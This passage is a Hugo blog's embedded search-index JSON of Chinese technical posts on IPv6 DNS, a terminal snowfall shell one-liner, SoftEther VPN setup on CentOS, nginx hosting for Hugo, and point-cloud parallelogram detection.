大家熟悉的A记录是DNS中IPv4的对应地址，相应的IPv6地址叫AAAA记录。设置成功后就可以直接用DNS进行访问了。\n1# ping6 [Client IPv6 DNS name] 2# curl --globoff -6 [Client IPv6 DNS name] 附录 IPv4私有地址 RFC1918 规定区块名 IP地址区段 IP数量 分类网络说明 最大CIDR区块（子网络遮罩） 主机端位长 24位区块 10.0.0.0 – 10.255.255.255 16,777,216 单个A类网络 10.0.0.0/8(255.0.0.0) 24位 Shared Address Space 100.64.0.0 - 100.127.255.255 4,194,304 64个连续B类网络 100.64.0.0/10 (255.192.0.0) 22位 20位区块 172.16.0.0 – 172.31.255.255 1,048,576 16个连续B类网络 172.16.0.0/12(255.240.0.0) 20位 16位区块 192.168.0.0 – 192.168.255.255 65,536 256个连续C类网络 192.168.0.0/16(255.255.0.0) 16位 参考资料 https://zh.wikipedia.org/wiki/IPv6 http://baike.baidu.com/item/IPv6 http://test-ipv6.com/faq_6to4.html ", 
    "url": "http:\/\/localhost:1313\/post\/network\/ipv6_support\/"
        },
    
    
    "http:\/\/localhost:1313\/tags\/script\/": {
        
        "title": "Script",
            "tags": [],
    "content": "", 
    "url": "http:\/\/localhost:1313\/tags\/script\/"
        },
    
    
    "http:\/\/localhost:1313\/tags\/shell\/": {
        
        "title": "Shell",
            "tags": [],
    "content": "", 
    "url": "http:\/\/localhost:1313\/tags\/shell\/"
        },
    
    
    "http:\/\/localhost:1313\/categories\/shell\/": {
        
        "title": "Shell",
            "tags": [],
    "content": "", 
    "url": "http:\/\/localhost:1313\/categories\/shell\/"
        },
    
    
    "http:\/\/localhost:1313\/post\/programming\/shell\/": {
        
        "title": "Shell",
            "tags": [],
    "content": "", 
    "url": "http:\/\/localhost:1313\/post\/programming\/shell\/"
        },
    
    
    "http:\/\/localhost:1313\/post\/programming\/shell\/snow_shell\/": {
        
        "title": "一行代码让你的字符终端下起雪来！",
            "tags": [ "shell",  "script", ],
    "content": "\n在网上一段[shell](http://jerrygamblin.com/2016/12/21/making-it-snow-in-your-terminal/ \u0026ldquo;Jerry Gamblin\u0026rdquo; target=\u0026quot;_blank\u0026quot;)脚本，虽然只有一行但运行后可以在屏幕上实现下雪的效果，实在让人佩服，决定好好研究一下。\n1 for((I=0;J=--I;))do clear;for((D=LINES;S=++J**3%COLUMNS,--D;))do printf %*s.\\\\n $S;done;sleep .1;done 不过原代码虽然简洁但不太容易一下子看明白工作原理，而且只能在命令行上运行无法保存成脚本文件，所以自己按照理解重新写了一遍： 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 #!/bin/sh rows=$(tput lines) cols=$(tput cols) i=0 while true do clear ((x=i,i++)) for((r=0;r\u0026lt;rows;r++)) do printf \u0026#34;%*s*\\n\u0026#34; $((x**3%cols)) ((x--)) done sleep .1 done ", 
    "url": "http:\/\/localhost:1313\/post\/programming\/shell\/snow_shell\/"
        },
    
    
    "http:\/\/localhost:1313\/tags\/softether\/": {
        
        "title": "SoftEther",
            "tags": [],
    "content": "", 
    "url": "http:\/\/localhost:1313\/tags\/softether\/"
        },
    
    
    "http:\/\/localhost:1313\/tags\/vpn\/": {
        
        "title": "VPN",
            "tags": [],
    "content": "", 
    "url": "http:\/\/localhost:1313\/tags\/vpn\/"
        },
    
    
    "http:\/\/localhost:1313\/post\/network\/setup_softether\/": {
        
        "title": "搭建SoftEther VPN 服务",
            "tags": [ "VPN",  "SoftEther", ],
    "content": "最近在公司内部架了台服务器给团队的同学们使用，可是在公司外面的时候就没办法再继续访问上面的资源了实在不太方便，虽然利用公司路由器的可以将服务器端口映射出去，但这样做只能访问部分资源，还是搭建一套VPN服务器更加适合所有人的需求。\n研究了一下PPP/L2TP，但PPP已经在iOS设备上见不到了，L2TP又对CentOS 7.3支持不友好，后来找到了SoftEther，发现不仅协议支持全面而且支持命令行／图形界面的管理工具，使用和管理都很方便。\n搭建方法 通过Local bridge的方式访问远程网络 具体过程可以参照官方文档，这种方法也是我最开始使用的方法，但搭建好之后发现这种连接的设备无法访问搭建VPN的服务器本身，但是我们这台服务器上提供了需要大家访问的资源，因此这对与我们公司来说是无法接受的。原因也可以理解，因为Linux不允许访问Local bridge网络接口对应的IP。具体可以参考官方文档的解释：\nLimitations within the Linux or UNIX operating system prevent communication with IP addresses assigned to the network adapter locally bridged from the VPN side (Virtual Hub side). The cause of this restriction lies with OS\u0026rsquo;s internal kernel codes rather than with the SoftEther VPN. When wishing to communicate in any form with a UNIX computer used for local bridging from the VPN side (Virtual Hub side), (for instance, when running both the VPN Server / VPN Bridge service \u0026amp; the HTTP Server service and wishing to grant access to the server service from the VPN side as well), prepare and connect a local bridge network adapter and physically connect both it and the existing network adapter to the same segment (as explained in 3.6 Local Bridges, it is recommended to prepare a network adapter for exclusive use in local bridging for this and other situations).\n通过tap网络接口 后来发现可以通过tap设备来解决访问VPN服务器本身的问题，原理就是创建出一个tap设备并将它桥接到真实设备上。tap设备的配置过程和Local bridge方式基本一致，可以参考下图： CentOS系统设置 完成tap设备配置后，在CentOS上还需要完成下面的设置才可以使用：\n防火墙配置，允许VPN服务器的配置和客户连接： 1$ sudo firewall-cmd –zone=public –add-port=500/udp –permanent 2$ sudo firewall-cmd –zone=public –add-port=4500/udp –permanent 3$ sudo firewall-cmd –zone=public –add-port=1701/udp –permanent 4$ sudo firewall-cmd –zone=public –add-port=443/tcp –permanent 5$ sudo firewall-cmd –reload\n配置tap device： 1$ sudo brctl addif br0 tap_soft 2$ sudo brctl show 3bridge name bridge id STP enabled interfaces 4br0 8000.00acc3a0fd4d yes p4p2 5tap_soft\n", 
    "url": "http:\/\/localhost:1313\/post\/network\/setup_softether\/"
        },
    
    
    "http:\/\/localhost:1313\/tags\/hugo\/": {
        
        "title": "Hugo",
            "tags": [],
    "content": "", 
    "url": "http:\/\/localhost:1313\/tags\/hugo\/"
        },
    
    
    "http:\/\/localhost:1313\/post\/network\/web\/hugo_installation\/": {
        
        "title": "使用nginx搭建hugo静态blog服务",
            "tags": [ "hugo",  "nginx", ],
    "content": "之前使用过wordpress搭建过内容管理网站，但是运行环境搭建有些复杂而且页面内容创建需要不够方便，后来关注到静态页面网站框架，发现可以使用markdown进行内容编辑，这对于程序猿来说简直再有好不过了！\n简单检索了一下静态内容管理的有很多实现，Ruby的Jekyll，Python的Sphinx doc，Go的Hugo，因为最近在学习Go所以决定搭建一个Hugo来研究下。\n使用源码部署hugo 部署golang 下载hugo源代码 hugo的基本使用 创建项目 创建post 使用themes 构造页面 执行成功后创建出下面的页面：\n服务部署 第一步，使用 hugo 命令生成静态文件内容\n$ cd \u0026lt;hugo project home\u0026gt; $ hugo 执行完以上操作后会在项目目录中产生 public 目录，这个目录中包括了可以部署的静态文件。把 public 目录复制到 nginx 的公开目录中。\n第二步，配置 nginx\nserver { listen 80; listen [::]:80; server_name yourhostname; location / { root /directory/of/public; } } 至此，系统的搭建基本完成，赶紧访问吧 :-)\nhugo theme开发 templating 变量访问: {{ var }} front matter variables Site variables 作用：访问站点配置文件中的内容 Page variables File variables ", 
    "url": "http:\/\/localhost:1313\/post\/network\/web\/hugo_installation\/"
        },
    
    
    "http:\/\/localhost:1313\/post\/_header\/": {
        
        "title": "",
            "tags": [],
    "content": "\n", 
    "url": "http:\/\/localhost:1313\/post\/_header\/"
        },
    
    
    "http:\/\/localhost:1313\/post\/pcl\/pcl-%E5%B9%B3%E8%A1%8C%E5%9B%9B%E8%BE%B9%E5%BD%A2%E8%AF%86%E5%88%AB\/": {
        
        "title": "",
            "tags": [],
    "content": "流程框架 从 3D 点云中分割平面 把平面包含的点映射 project 到平面上 映射出的 3D 平面变换到 2D 坐标系平面上 从 2D 平面找出平行四边形 将平行四边形反向旋转恢复出 3D 空间中的平面四边形 从 2D 平面照出平行四边形的方法 PCA检测主轴方向 可以找到平行四边形的两个主轴方向，但无法确定每个边的长度\n问题：\n当电云分布不均匀时，导致PCA主轴方向向密度更高的方向略微偏移 边缘检测法 使用包络 (Graham Scan) 扫描出四边形的外围轮廓线 将靠近轮廓线的点距离小于某个阀值的所有点取出来 在取出的点中使用 RANSAC 估计4根直线 计算出 4 根直线的交点 ", 
    "url": "http:\/\/localhost:1313\/post\/pcl\/pcl-%E5%B9%B3%E8%A1%8C%E5%9B%9B%E8%BE%B9%E5%BD%A2%E8%AF%86%E5%88%AB\/"
        },
    
    
    "http:\/\/localhost:1313\/post\/searchengine\/es_material\/": {
        
        "title": "SearchEngine",
            "tags": [],
    "content": " 参考资料： Elasticsearch权威指南（中文版）\n", 
    "url": "http:\/\/localhost:1313\/post\/searchengine\/es_material\/"
        },
    
    }
</script>

<script src="/js/lunr.min.js"></script>
<script src="/js/search.js"></script>

</footer>
</body>
</html>
